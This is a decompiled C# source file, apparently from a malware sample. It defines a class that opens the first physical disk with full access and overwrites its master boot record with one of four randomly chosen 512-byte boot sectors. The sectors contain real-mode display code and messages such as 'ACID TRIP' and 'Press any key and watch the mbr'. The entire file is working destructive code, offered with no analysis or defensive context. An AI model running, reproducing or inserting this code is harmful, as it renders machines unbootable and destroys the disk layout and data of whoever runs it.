using System;
using System.Runtime.InteropServices;

namespace MbrOverwriterRANDOM
{
	// Token: 0x0200002A RID: 42
	public static class Class1
	{
		// Token: 0x060001AE RID: 430
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x060001AF RID: 431
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		// Token: 0x060001B0 RID: 432 RVA: 0x00009678 File Offset: 0x00007878
		public static void OverwriteMBR()
		{
			Random random = new Random();
			switch (random.Next(1, 5))
			{
			case 1:
				Class1.OverwriteMBR1();
				break;
			case 2:
				Class1.OverwriteMBR2();
				break;
			case 3:
				Class1.OverwriteMBR3();
				break;
			case 4:
				Class1.OverwriteMBR4();
				break;
			}
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x000096D4 File Offset: 0x000078D4
		private static void OverwriteMBR1()
		{
			byte[] array = new byte[]
			{
				232, 3, 0, 232, 41, 0, 180, 0, 176, 19,
				205, 16, 104, 0, 160, 7, 180, 12, 48, 192,
				49, 219, 49, 201, 186, 8, 0, 219, 227, 232,
				237, 0, 195, 49, 201, 186, 8, 0, 131, 6,
				103, 125, 45, 232, 1, 0, 195, 137, 14, 105,
				125, 137, 22, 107, 125, 129, 62, 103, 125, 0,
				8, 119, 46, 129, 62, 103, 125, 0, 6, 119,
				113, 129, 62, 103, 125, 0, 4, 119, 115, 129,
				62, 103, 125, 0, 2, 119, 202, 114, 88, 129,
				249, 64, 1, 15, 131, 166, 0, 129, 250, 200,
				0, 115, 186, 205, 16, 65, 235, 195, 195, 49,
				byte.MaxValue, 185, 0, 125, 176, 0, 243, 170, 185, 200,
				0, 186, 52, 3, 137, 208, 49, 248, 49, 240,
				133, 200, 117, 3, 38, 136, 29, 71, 74, 117,
				239, 73, 117, 236, 70, 254, 195, 232, 155, 0,
				232, 15, 0, 232, 149, 0, 232, 9, 0, 232,
				143, 0, 232, 3, 0, 232, 197, byte.MaxValue, 96, 185,
				byte.MaxValue, byte.MaxValue, 73, 117, 253, 97, 195, 160, 103, 125,
				48, 200, 235, 161, 160, 103, 125, 36, 15, 192,
				224, 4, 235, 151, 137, 203, 49, 211, 51, 30,
				103, 125, 2, 30, 103, 125, 136, 216, 208, 224,
				235, 5, 184, 3, 0, 205, 25, 60, 100, 119,
				7, 60, 30, 114, 7, 233, 117, byte.MaxValue, 44, 65,
				235, 241, 4, 50, 235, 237, 60, 40, 119, 7,
				60, 20, 114, 7, 233, 98, byte.MaxValue, 44, 35, 235,
				241, 4, 45, 235, 237, 160, 103, 125, 48, 216,
				233, 82, byte.MaxValue, 49, 201, 66, 233, 34, byte.MaxValue, 80,
				83, 137, 200, 142, 216, 180, 14, 190, 86, 125,
				138, 4, 48, byte.MaxValue, 179, 44, 254, 195, 128, 251,
				85, 116, 247, 205, 16, 70, 138, 4, 60, 0,
				117, 240, 91, 88, 195, 176, 2, 230, 67, 176,
				56, 230, 64, 176, byte.MaxValue, 230, 64, 228, 97, 12,
				3, 230, 97, 232, 7, 0, 228, 97, 36, 252,
				230, 97, 195, 96, 185, byte.MaxValue, byte.MaxValue, 73, 117, 253,
				97, 195, 52, 49, 46, 101, 120, 101, 32, 65,
				67, 73, 68, 32, 84, 82, 73, 80, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				uint num;
				Class1.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
			}
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000973C File Offset: 0x0000793C
		private static void OverwriteMBR2()
		{
			byte[] array = new byte[]
			{
				232, 3, 0, 232, 72, 0, 184, 19, 0, 205,
				16, 184, 0, 160, 142, 192, 49, byte.MaxValue, 49, 219,
				49, 246, 49, byte.MaxValue, 185, 0, 125, 176, 0, 243,
				170, 185, 200, 0, 186, 64, 1, 137, 208, 49,
				248, 49, 240, 133, 200, 117, 3, 38, 136, 29,
				71, 74, 117, 239, 73, 117, 236, 70, 128, 195,
				9, 128, 227, byte.MaxValue, 232, 2, 0, 235, 209, 96,
				185, byte.MaxValue, byte.MaxValue, 73, 117, 253, 97, 195, 186, 0,
				0, 136, 208, 136, 212, 183, 2, 205, 16, 66,
				131, 250, 96, 114, 242, 195, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				uint num;
				Class1.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
			}
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x000097A4 File Offset: 0x000079A4
		private static void OverwriteMBR3()
		{
			byte[] array = new byte[]
			{
				49, 192, 142, 216, 142, 192, 187, 0, 184, 142,
				195, 232, 5, 0, 232, 14, 0, 235, 254, 191,
				0, 0, 185, 208, 7, 184, 32, 7, 243, 171,
				195, 185, 208, 7, 191, 0, 0, 232, 14, 0,
				36, 15, 136, 196, 176, 219, 171, 226, 244, 232,
				5, 0, 235, 233, 228, 64, 195, 185, byte.MaxValue, byte.MaxValue,
				226, 254, 195, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				uint num;
				Class1.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
			}
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x0000980C File Offset: 0x00007A0C
		private static void OverwriteMBR4()
		{
			byte[] array = new byte[]
			{
				49, 192, 142, 216, 142, 192, 187, 0, 184, 142,
				195, 232, 11, 0, 232, 20, 0, 232, 34, 0,
				232, 36, 0, 235, 254, 191, 0, 0, 185, 208,
				7, 184, 32, 7, 243, 171, 195, 190, 93, 124,
				191, 0, 0, 180, 4, 172, 60, 0, 116, 3,
				171, 235, 248, 195, 48, 228, 205, 22, 195, 49,
				210, 185, 208, 7, 191, 0, 0, 136, 212, 176,
				219, 171, 226, 253, 232, 10, 0, 254, 194, 128,
				226, 15, 235, 233, 228, 64, 195, 185, byte.MaxValue, byte.MaxValue,
				226, 254, 195, 80, 114, 101, 115, 115, 32, 97,
				110, 121, 32, 107, 101, 121, 32, 97, 110, 100,
				32, 119, 97, 116, 99, 104, 32, 116, 104, 101,
				32, 109, 98, 114, 32, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				uint num;
				Class1.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
			}
		}

		// Token: 0x0400008D RID: 141
		private const uint GenericRead = 2147483648U;

		// Token: 0x0400008E RID: 142
		private const uint GenericWrite = 1073741824U;

		// Token: 0x0400008F RID: 143
		private const uint GenericExecute = 536870912U;

		// Token: 0x04000090 RID: 144
		private const uint GenericAll = 268435456U;

		// Token: 0x04000091 RID: 145
		private const uint FileShareRead = 1U;

		// Token: 0x04000092 RID: 146
		private const uint FileShareWrite = 2U;

		// Token: 0x04000093 RID: 147
		private const uint OpenExisting = 3U;

		// Token: 0x04000094 RID: 148
		private const uint MbrSize = 512U;
	}
}
